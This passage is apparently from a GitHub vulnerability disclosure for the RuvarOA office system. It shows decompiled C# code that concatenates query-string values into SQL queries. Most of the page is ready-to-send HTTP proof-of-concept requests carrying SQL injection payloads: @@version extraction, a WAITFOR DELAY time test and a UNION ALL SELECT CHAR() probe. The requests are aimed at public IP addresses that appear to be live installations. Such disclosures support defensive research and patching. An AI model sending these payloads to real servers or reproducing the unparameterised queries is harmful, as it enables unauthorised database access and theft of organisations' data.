src="https://private-user-images.githubusercontent.com/18260135/302584116-52a4aa30-09d2-4283-8671-6ea0dd8c7c82.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1ODQxMTYtNTJhNGFhMzAtMDlkMi00MjgzLTg2NzEtNmVhMGRkOGM3YzgyLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWUzNGNjYjc3MzBmMTkzZDEwOGQzODBmMDJlZmE0MmY3YWZiMDk3MDI1NTcyMWExMDFiNzUyYzZjMjA3N2YxNDImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.jdeOIYh4C_o9ANG82ge-LdqhNeYlQZ2_Lil2-LvWpFE" style="max-width: 100%;"></a>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">Vulnerability analysis</h4><a id="user-content-vulnerability-analysis-15" class="anchor" aria-label="Permalink: Vulnerability analysis" href="#vulnerability-analysis-15"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">function WorkPlanAttachDownLoad within the DLL file /RuvarOA/bin/WorkPlan.dll</p>
<pre><code>public class WorkPlanAttachDownLoad : Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
        string text = ((Page)this).Request.QueryString["sys_file_storage_id"];
        string text2 = "";
        string text3 = "";
        string text4 = "";
        text2 = "select top 1 * from workplan_attach where (sys_file_storage_id='" + text + "')order by sys_file_storage_id desc";
        if (text2 != "")
        {
            SqlDataReader val = SqlHelper.ExecuteReader(text2);
            while (((DbDataReader)(object)val).Read())
            {
                text4 = ((DbDataReader)(object)val)["file_type"].ToString();
                text3 = ((DbDataReader)(object)val)["file_name"].ToString();
                byte[] array = new byte[((DbDataReader)(object)val).GetBytes(12, 0L, (byte[]?)null, 0, int.MaxValue)];
                ((DbDataReader)(object)val).GetBytes(12, 0L, array, 0, array.Length);
                ((Control)this).Page.Response.ContentType = text4;
                ((Control)this).Page.Response.AddHeader("Content-Disposition", "attachment; filename=" + HttpUtility.UrlEncodeUnicode(text3) + ";");
                ((Control)this).Page.Response.BinaryWrite(array);
            }
            ((DbDataReader)(object)val).Close();
        }
    }
</code></pre>
<p dir="auto">The direct use of <code>Request.QueryString["sys_file_storage_id"]</code> to retrieve a value and then concatenate it into an SQL statement has resulted in an SQL injection vulnerability.</p>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">file_memo.aspx</h3><a id="user-content-file_memoaspx" class="anchor" aria-label="Permalink: file_memo.aspx" href="#file_memoaspx"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">path</h4><a id="user-content-path-16" class="anchor" aria-label="Permalink: path" href="#path-16"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">filemanage/file_memo.aspx</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">POC</h4><a id="user-content-poc-16" class="anchor" aria-label="Permalink: POC" href="#poc-16"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<pre><code>GET /filemanage/file_memo.aspx?file_id=@@version HTTP/1.1
Host: 121.33.254.78:88
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5807.225 Safari/537.36 Edg/112.0.1791.33
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,zh-HK;q=0.8,zh-TW;q=0.7,zh-CN;q=0.6,zh;q=0.5
Connection: close


</code></pre>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/18260135/302584500-daefa354-e238-4f71-9130-f7b12b958dbf.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1ODQ1MDAtZGFlZmEzNTQtZTIzOC00ZjcxLTkxMzAtZjdiMTJiOTU4ZGJmLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWY3OGU3YTQzN2FlNmEwNTllNzc2ZTM2YjMzM2Y1ZmU1ZDI1ZDFjYmUwNjJmMTliNWI4M2MzMjdkNjVmZGM4NTcmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.x3yqXsW9rcI0yNDGoDNRhB_mU3mGWyst-jhyl4GebL4"><img width="1062" alt="image" src="https://private-user-images.githubusercontent.com/18260135/302584500-daefa354-e238-4f71-9130-f7b12b958dbf.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1ODQ1MDAtZGFlZmEzNTQtZTIzOC00ZjcxLTkxMzAtZjdiMTJiOTU4ZGJmLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWY3OGU3YTQzN2FlNmEwNTllNzc2ZTM2YjMzM2Y1ZmU1ZDI1ZDFjYmUwNjJmMTliNWI4M2MzMjdkNjVmZGM4NTcmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.x3yqXsW9rcI0yNDGoDNRhB_mU3mGWyst-jhyl4GebL4" style="max-width: 100%;"></a>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">Vulnerability analysis</h4><a id="user-content-vulnerability-analysis-16" class="anchor" aria-label="Permalink: Vulnerability analysis" href="#vulnerability-analysis-16"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">function file_memo within the DLL file /RuvarOA/bin/filemanage.dll</p>
<pre><code>public class file_memo : Page
{
    protected HtmlForm Form1;

    protected TextBox txt_file_memo;

    protected Button btnConfirm;

    protected TextBox txt_file_id;

    protected void Page_Load(object sender, EventArgs e)
    {
        if (!((Page)this).IsPostBack)
        {
            txt_file_id.Text = ((Page)this).Request.QueryString["file_id"];
            if (Validate.isNullOrSpace(txt_file_id.Text))
            {
                txt_file_id.Text = "0";
            }
            DataView dataView = SqlHelper.QueryView("select * from info_file where file_id=" + txt_file_id.Text);
            if (dataView.Count &gt; 0)
            {
                txt_file_memo.Text = dataView[0]["file_memo"].ToString();
            }
            dataView.Dispose();
        }
    }
</code></pre>
<p dir="auto">The direct use of <code>Request.QueryString["file_id"]</code> to retrieve a value and then concatenate it into an SQL statement has resulted in an SQL injection vulnerability.</p>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">get_company.aspx</h3><a id="user-content-get_companyaspx" class="anchor" aria-label="Permalink: get_company.aspx" href="#get_companyaspx"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">path</h4><a id="user-content-path-17" class="anchor" aria-label="Permalink: path" href="#path-17"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">ContractManage/get_company.aspx</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">POC</h4><a id="user-content-poc-17" class="anchor" aria-label="Permalink: POC" href="#poc-17"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<pre><code>POST /ContractManage/get_company.aspx HTTP/1.1
Host: 119.131.131.101:8000
Content-Length: 527
Cache-Control: max-age=0
Origin: http://119.131.131.101:8000
DNT: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux i686) Gecko/20060204 Firefox/114.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://119.131.131.101:8000/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,zh-HK;q=0.8,zh-TW;q=0.7,zh-CN;q=0.6,zh;q=0.5
Connection: close

__EVENTTARGET=&amp;__EVENTARGUMENT=&amp;__LASTFOCUS=&amp;__VIEWSTATE=%2FwEPDwULLTE2NjkyODU1NDAPZBYCAgMPZBYGAgEPEGQPFgFmFgEQBQzpgInmi6nliIbnsbtlZxYBZmQCCQ88KwALAQAPFggeCERhdGFLZXlzFgAeC18hSXRlbUNvdW50Zh4JUGFnZUNvdW50AgEeFV8hRGF0YVNvdXJjZUl0ZW1Db3VudGZkZAILDw8WAh4RUGFnZXJfUmVjb3JkY291bnRmZGRkjBOPpsjzfyKuMGne7EKY2cnc17Zi99ZVNb4cfmiP0Z0%3D&amp;ddl_type=&amp;ddl_field=dw_bh&amp;txt_keyword=11'%3bWAITFOR+DELAY+'0%3a0%3a5'--&amp;btnSearch=%E6%9F%A5%E8%AF%A2&amp;pager_input=1&amp;pager_select=20&amp;txt_row_index=&amp;txt_dw_id=&amp;txt_dw_mc=&amp;txt_dw_bh=&amp;txt_dw_lxr=&amp;txt_dw_dh=
</code></pre>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/18260135/302585020-ef8b65c2-b5d5-49f1-a3f7-f6ad6a35c942.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1ODUwMjAtZWY4YjY1YzItYjVkNS00OWYxLWEzZjctZjZhZDZhMzVjOTQyLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTMxNDUzY2NjY2JiNTNkYWM3ZWIxZDY4NDFiYjQ3ZjA2MjQ5NWQ2OTliM2QwNGI3OGQwOTNiMWNlNDdkYjA0Y2QmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.XIqv2IWu74lx1W-vYGmPCt-DRpfsgh1NKWpdXw9cL8M"><img width="1920" alt="image-20240127234534888" src="https://private-user-images.githubusercontent.com/18260135/302585020-ef8b65c2-b5d5-49f1-a3f7-f6ad6a35c942.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1ODUwMjAtZWY4YjY1YzItYjVkNS00OWYxLWEzZjctZjZhZDZhMzVjOTQyLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTMxNDUzY2NjY2JiNTNkYWM3ZWIxZDY4NDFiYjQ3ZjA2MjQ5NWQ2OTliM2QwNGI3OGQwOTNiMWNlNDdkYjA0Y2QmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.XIqv2IWu74lx1W-vYGmPCt-DRpfsgh1NKWpdXw9cL8M" style="max-width: 100%;"></a>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/18260135/302585101-5a01d1c7-f3a9-4562-87d8-08f56505add1.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1ODUxMDEtNWEwMWQxYzctZjNhOS00NTYyLTg3ZDgtMDhmNTY1MDVhZGQxLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWUyY2FkNDFhNzJkYTliOTJmZjAwY2Q0MDkyMDlkMTY5MWU5ZTE4MTE0ZTQ4MTE0OTIzYTU5ODFmMTMxYzY3YTkmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.fCREK9MRr0FjooKVn7dgXBTOG6904C9uraPI-T9gkxI"><img width="1920" alt="image-20240127234448332" src="https://private-user-images.githubusercontent.com/18260135/302585101-5a01d1c7-f3a9-4562-87d8-08f56505add1.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1ODUxMDEtNWEwMWQxYzctZjNhOS00NTYyLTg3ZDgtMDhmNTY1MDVhZGQxLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWUyY2FkNDFhNzJkYTliOTJmZjAwY2Q0MDkyMDlkMTY5MWU5ZTE4MTE0ZTQ4MTE0OTIzYTU5ODFmMTMxYzY3YTkmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.fCREK9MRr0FjooKVn7dgXBTOG6904C9uraPI-T9gkxI" style="max-width: 100%;"></a>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/18260135/302585168-7efb73ef-64ef-49b8-ac25-66b82b044f1f.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1ODUxNjgtN2VmYjczZWYtNjRlZi00OWI4LWFjMjUtNjZiODJiMDQ0ZjFmLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWFmODBlZTFmZDFiMzRkZmNhNWVlNWNlYzRhNTNiNDE5Y2FmOTAzZjRhOGI5MTU3MTczNDJhOThjMGMyODU5ZjgmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.U9mTY0NC72qCMcovRxq02sDhc4lvZQg790EFpFHuvFg"><img width="1918" alt="image-20240127234559341" src="https://private-user-images.githubusercontent.com/18260135/302585168-7efb73ef-64ef-49b8-ac25-66b82b044f1f.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1ODUxNjgtN2VmYjczZWYtNjRlZi00OWI4LWFjMjUtNjZiODJiMDQ0ZjFmLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWFmODBlZTFmZDFiMzRkZmNhNWVlNWNlYzRhNTNiNDE5Y2FmOTAzZjRhOGI5MTU3MTczNDJhOThjMGMyODU5ZjgmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.U9mTY0NC72qCMcovRxq02sDhc4lvZQg790EFpFHuvFg" style="max-width: 100%;"></a>
<pre><code>POST /ContractManage/get_company.aspx HTTP/1.1
Host: 119.131.131.101:8000
Content-Length: 1149
Cache-Control: max-age=0
Origin: http://119.131.131.101:8000
DNT: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux i686) Gecko/20060204 Firefox/114.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://119.131.131.101:8000/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,zh-HK;q=0.8,zh-TW;q=0.7,zh-CN;q=0.6,zh;q=0.5
Connection: close

__EVENTTARGET=&amp;__EVENTARGUMENT=&amp;__LASTFOCUS=&amp;__VIEWSTATE=/wEPDwULLTE2NjkyODU1NDAPZBYCAgMPZBYIAgEPEGQPFgFmFgEQBQzpgInmi6nliIbnsbtlZxYBZmQCCQ88KwALAQAPFggeCERhdGFLZXlzFgAeC18hSXRlbUNvdW50Zh4JUGFnZUNvdW50AgEeFV8hRGF0YVNvdXJjZUl0ZW1Db3VudGZkZAILDw8WBB4WUGFnZXJfQ3VycmVudFBhZ2VJbmRleGYeEVBhZ2VyX1JlY29yZGNvdW50ZmRkAg0PFgIeBFRleHQFATBkZGkRakgZwcKyYwt4sQf48JqdFzMTXVIZFd8gYajJYD8E&amp;ddl_type=&amp;ddl_field=dw_bh&amp;txt_keyword=11'+UNION+ALL+SELECT+CHAR(113)%2bCHAR(106)%2bCHAR(98)%2bCHAR(112)%2bCHAR(113)%2bCHAR(68)%2bCHAR(73)%2bCHAR(66)%2bCHAR(87)%2bCHAR(101)%2bCHAR(105)%2bCHAR(103)%2bCHAR(119)%2bCHAR(82)%2bCHAR(81)%2bCHAR(69)%2bCHAR(118)%2bCHAR(85)%2bCHAR(110)%2bCHAR(87)%2bCHAR(71)%2bCHAR(115)%2bCHAR(112)%2bCHAR(121)%2bCHAR(121)%2bCHAR(101)%2bCHAR(82)%2bCHAR(100)%2bCHAR(81)%2bCHAR(100)%2bCHAR(100)%2bCHAR(116)%2bCHAR(86)%2bCHAR(100)%2bCHAR(73)%2bCHAR(82)%2bCHAR(99)%2bCHAR(110)%2bCHAR(84)%2bCHAR(74)%2bCHAR(105)%2bCHAR(86)%2bCHAR(107)%2bCHAR(100)%2bCHAR(118)%2bCHAR(113)%2bCHAR(122)%2bCHAR(120)%2bCHAR(113)%2bCHAR(113)--+CwAf&amp;btnSearch=%E6%9F%A5%E8%AF%A2&amp;pager_input=1&amp;pager_select=20&amp;txt_row_index=&amp;txt_dw_id=&amp;txt_dw_mc=&amp;txt_dw_bh=&amp;txt_dw_lxr=&amp;txt_dw_dh=

</code></pre>
